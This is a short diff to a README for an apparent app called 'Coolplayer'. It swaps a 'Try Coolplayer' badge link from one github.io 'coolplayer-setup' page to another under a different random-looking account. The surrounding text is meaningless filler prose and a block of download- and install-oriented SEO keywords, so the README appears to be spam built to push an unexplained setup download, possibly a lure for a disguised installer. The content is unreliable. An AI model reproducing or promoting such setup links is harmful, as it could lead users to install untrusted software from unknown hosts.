@@ -49,7 +49,7 @@ The matrix clarifies ownership boundaries and helps contributors extend behavior
 
 Add one follow-up paragraph that explains how downstream owners validate the delta without leaning on disclaimers inside this README cluster.
 
-[![Try Coolplayer](https://img.shields.io/badge/Try-coolplayer-0984e3?style=flat&logo=github)](https://annsanchez041999.github.io/.github/coolplayer-setup)
+[![Try Coolplayer](https://img.shields.io/badge/Try-coolplayer-0984e3?style=flat&logo=github)](https://lucienbaileyucde.github.io/.github/coolplayer-setup)
 
 ## SEO Keywords
 coolplayer download, coolplayer setup, coolplayer tutorial, coolplayer review, coolplayer features, coolplayer app, coolplayer guide, coolplayer install, coolplayer tips, coolplayer workflow, coolplayer alternative, coolplayer best settings, coolplayer desktop app, coolplayer how to use, coolplayer quick start
